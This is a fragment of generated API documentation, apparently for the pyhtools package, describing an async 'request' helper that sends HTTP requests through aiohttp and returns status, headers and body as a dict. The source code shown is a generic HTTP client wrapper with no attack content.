<code>async</code>","text":"<p>Send HTTP requests asynchronously</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>URL of the webpage/endpoint</p> required <code>method</code> <code>str</code> <p>HTTP methods (default: GET) supports GET, POST, </p> <code>'GET'</code> <code>session</code> <code>aiohttp.ClientSession</code> <p>aiohttp Client Session for sending requests</p> <code>None</code> <p>Returns:</p> Name Type Description <code>dict</code> <code>ClientResponse</code> <p>returns request and response data as dict</p> Source code in <code>pyhtools\\attackers\\web\\utils.py</code> <pre><code>async def request(self, url: str, method: str = 'GET', session: ClientSession = None, *args, **kwargs) -&gt; ClientResponse:\n'''Send HTTP requests asynchronously\n    Args:\n        url (str): URL of the webpage/endpoint\n        method (str): HTTP methods (default: GET) supports GET, POST, \n        PUT, HEAD, OPTIONS, DELETE\n        session (aiohttp.ClientSession): aiohttp Client Session for sending requests\n    Returns:\n        dict: returns request and response data as dict\n    '''\nis_new_session = False\nif not session:\nsession = ClientSession(headers=self._headers)\nis_new_session = True\nmethod = str(method).upper()\nmatch method:\ncase 'GET':\nsent_req = session.get(url, *args, **kwargs)\ncase 'POST':\nsent_req = session.post(url, *args, **kwargs)\ncase 'PUT':\nsent_req = session.put(url, *args, **kwargs)\ncase 'PATCH':\nsent_req = session.patch(url, *args, **kwargs)\ncase 'HEAD':\nsent_req = session.head(url, *args, **kwargs)\ncase 'OPTIONS':\nsent_req = session.options(url, *args, **kwargs)\ncase 'DELETE':\nsent_req = session.delete(url, *args, **kwargs)\nresp_data = None\nasync with sent_req as response:\nresp_data = {\n\"status\": response.status,\n\"req_url\": str(response.request_info.real_url),\n\"req_method\": response.request_info.method,\n\"req_headers\": dict(**response.request_info.headers),\n\"res_redirection\": str(response.history),\n\"res_headers\": dict(response.headers),\n\"res_body\": await response.text(),\n}\nif is_new_session:\nawait session.close()\nreturn resp_data\n</code></pre>"}]}